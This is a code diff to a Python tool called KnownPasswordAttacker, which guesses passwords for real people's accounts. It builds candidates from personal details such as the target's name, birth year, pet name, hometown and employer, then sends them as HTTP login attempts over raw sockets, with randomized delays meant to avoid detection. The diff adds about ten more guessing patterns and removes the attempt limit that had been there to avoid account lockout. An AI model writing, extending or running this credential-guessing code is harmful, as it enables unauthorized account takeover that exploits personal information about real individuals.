@@ -30,7 +30,7 @@ class KnownPasswordAttacker:
         # Attack configuration
         self.delay_min = 0.5   # Slower, more human-like delays
         self.delay_max = 2.0   # To avoid detection
-        self.max_attempts = 20  # Limited attempts to avoid lockout
+        self.max_attempts = 100  # Increased attempts for more thorough testing
         
         self.user_agents = [
             "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36",
@@ -406,6 +406,112 @@ class KnownPasswordAttacker:
             for num in common_numbers:
                 passwords.append(f"{favorite_team}{num}")
         
+        # Pattern 11: More case variations
+        if first_name:
+            passwords.extend([
+                f"{first_name.lower()}{birth_year}",
+                f"{first_name.lower()}{birth_year_short}",
+                f"{first_name.upper()}{birth_year}",
+                f"{first_name.upper()}{birth_year_short}",
+                f"{first_name.lower()}{current_year}",
+                f"{first_name.upper()}{current_year}"
+            ])
+        
+        # Pattern 12: Name + Special combinations
+        if first_name:
+            for special in special_chars:
+                passwords.extend([
+                    f"{first_name.lower()}{special}",
+                    f"{first_name.upper()}{special}",
+                    f"{first_name}{special}{birth_year_short}",
+                    f"{first_name.lower()}{special}{birth_year_short}",
+                    f"{first_name}{special}{current_year[-2:]}",
+                ])
+        
+        # Pattern 13: Reverse combinations
+        if first_name and birth_year:
+            passwords.extend([
+                f"{birth_year}{first_name}",
+                f"{birth_year_short}{first_name}",
+                f"{birth_year}{first_name.lower()}",
+                f"{birth_year_short}{first_name.lower()}"
+            ])
+        
+        # Pattern 14: Pet name variations
+        if pet_name:
+            passwords.extend([
+                f"{pet_name.lower()}{birth_year}",
+                f"{pet_name.upper()}{birth_year}",
+                f"{pet_name.lower()}{birth_year_short}",
+                f"{pet_name.upper()}{birth_year_short}",
+                f"{pet_name.lower()}{current_year}",
+                f"{pet_name.upper()}{current_year}"
+            ])
+        
+        # Pattern 15: Number prefixes
+        if first_name:
+            for num in ["1", "12", "123"]:
+                passwords.extend([
+                    f"{num}{first_name}",
+                    f"{num}{first_name.lower()}",
+                    f"{num}{first_name}{birth_year_short}",
+                    f"{num}{first_name.lower()}{birth_year_short}"
+                ])
+        
+        # Pattern 16: Common password patterns
+        if first_name:
+            passwords.extend([
+                f"{first_name}password",
+                f"{first_name.lower()}password",
+                f"{first_name}pass",
+                f"{first_name.lower()}pass",
+                f"{first_name}123!",
+                f"{first_name.lower()}123!",
+                f"password{first_name}",
+                f"password{first_name.lower()}"
+            ])
+        
+        # Pattern 17: Double elements
+        if first_name and len(first_name) >= 3:
+            passwords.extend([
+                f"{first_name}{first_name}",
+                f"{first_name.lower()}{first_name.lower()}",
+                f"{first_name}{first_name}{birth_year_short}",
+                f"{first_name.lower()}{first_name.lower()}{birth_year_short}"
+            ])
+        
+        # Pattern 18: More hometown variations
+        if hometown != 'Unknown':
+            passwords.extend([
+                f"{hometown.lower()}{birth_year}",
+                f"{hometown.upper()}{birth_year}",
+                f"{hometown.lower()}{birth_year_short}",
+                f"{hometown.upper()}{birth_year_short}"
+            ])
+        
+        # Pattern 19: Company variations
+        if company:
+            passwords.extend([
+                f"{company.lower()}{birth_year}",
+                f"{company.upper()}{birth_year}",
+                f"{company.lower()}{birth_year_short}",
+                f"{company.upper()}{birth_year_short}",
+                f"{first_name}{company}",
+                f"{first_name.lower()}{company.lower()}"
+            ])
+        
+        # Pattern 20: Sequential numbers
+        if first_name:
+            for start in range(0, 10):
+                for length in range(2, 5):
+                    seq = ''.join(str((start + i) % 10) for i in range(length))
+                    passwords.extend([
+                        f"{first_name}{seq}",
+                        f"{first_name.lower()}{seq}",
+                        f"{seq}{first_name}",
+                        f"{seq}{first_name.lower()}"
+                    ])
+        
         # Remove duplicates and empty passwords
         self.generated_passwords = list(set([p for p in passwords if p and len(p) >= 4]))
         
@@ -504,19 +610,31 @@ Connection: close\r
             # Log what the packet would look like
             print(f"[*] Simulated packet construction:")
             
-            # Create headers for logging purposes
-            tcp_header = self.build_tcp_header(self.src_ip, self.target_host, 
-                                             random.randint(1024, 65535), self.target_port, 
-                                             fake_seq, fake_ack, psh_ack_flags, http_payload)
-            ip_header = self.build_ip_header(self.src_ip, self.target_host, len(tcp_header) + len(http_payload))
+            # Create headers for logging purposes (with error handling)
+            try:
+                tcp_header = self.build_tcp_header(self.src_ip, self.target_host, 
+                                                 random.randint(1024, 65535), self.target_port, 
+                                                 fake_seq, fake_ack, psh_ack_flags, http_payload)
+                ip_header = self.build_ip_header(self.src_ip, self.target_host, len(tcp_header) + len(http_payload))
+            except Exception as header_error:
+                print(f"[!] Packet header construction error: {header_error}")
+                # Skip packet simulation and continue with actual connection
+                tcp_header = None
+                ip_header = None
             
-            print(f"[SIMULATED SEND] Packet Details:")
-            self.log_ip_header(ip_header, "SEND")
-            self.log_tcp_header(tcp_header, "SEND")
-            print(f"    Payload Length: {len(http_payload)}")
-            print(f"    HTTP Request: POST /login (user: {username}, pass: {password})")
-            print(f"    OSINT Pattern: {pattern_used}")
-            print()
+            if tcp_header and ip_header:
+                print(f"[SIMULATED SEND] Packet Details:")
+                self.log_ip_header(ip_header, "SEND")
+                self.log_tcp_header(tcp_header, "SEND")
+                print(f"    Payload Length: {len(http_payload)}")
+                print(f"    HTTP Request: POST /login (user: {username}, pass: {password})")
+                print(f"    OSINT Pattern: {pattern_used}")
+                print()
+            else:
+                print(f"[*] Skipping packet simulation due to header error")
+                print(f"    HTTP Request: POST /login (user: {username}, pass: {password})")
+                print(f"    OSINT Pattern: {pattern_used}")
+                print()
             
             # Now make the actual connection and send data
             print(f"[*] Sending actual OSINT-based HTTP request via TCP socket...")
@@ -527,17 +645,26 @@ Connection: close\r
             response = sock.recv(4096)
             sock.close()
             
-            # Log simulated response packet details
-            print(f"[SIMULATED RECV] Response packet details:")
-            response_tcp_header = self.build_tcp_header(self.target_host, self.src_ip,
-                                                       self.target_port, random.randint(1024, 65535),
-                                                       fake_ack, fake_seq + len(http_payload), 0x018, response)
-            response_ip_header = self.build_ip_header(self.target_host, self.src_ip, len(response_tcp_header) + len(response))
-            
-            self.log_ip_header(response_ip_header, "RECV")
-            self.log_tcp_header(response_tcp_header, "RECV")
-            print(f"    Payload Length: {len(response)}")
-            print()
+            # Log simulated response packet details (with error handling)
+            if tcp_header and ip_header:  # Only if send headers worked
+                try:
+                    print(f"[SIMULATED RECV] Response packet details:")
+                    response_tcp_header = self.build_tcp_header(self.target_host, self.src_ip,
+                                                               self.target_port, random.randint(1024, 65535),
+                                                               fake_ack, fake_seq + len(http_payload), 0x018, response)
+                    response_ip_header = self.build_ip_header(self.target_host, self.src_ip, len(response_tcp_header) + len(response))
+                    
+                    self.log_ip_header(response_ip_header, "RECV")
+                    self.log_tcp_header(response_tcp_header, "RECV")
+                    print(f"    Payload Length: {len(response)}")
+                    print()
+                except Exception as recv_header_error:
+                    print(f"[!] Response packet header error: {recv_header_error}")
+                    print(f"    Response received: {len(response)} bytes")
+                    print()
+            else:
+                print(f"[*] Response received: {len(response)} bytes")
+                print()
             
             self.attempts += 1
             response_time = time.time() - attempt_start
@@ -643,10 +770,10 @@ Connection: close\r
             print("[-] No password candidates generated. Aborting attack.")
             return
         
-        # Step 3: Limit attempts to avoid detection
-        attack_passwords = passwords[:self.max_attempts]
+        # Step 3: Try all generated passwords (remove artificial limit)
+        attack_passwords = passwords  # Use all generated passwords
         
-        print(f"\n[*] Starting password attempts (Limited to {len(attack_passwords)} attempts)")
+        print(f"\n[*] Starting password attempts ({len(attack_passwords)} total attempts)")
         print("-" * 60)
         
         self.start_time = time.time()
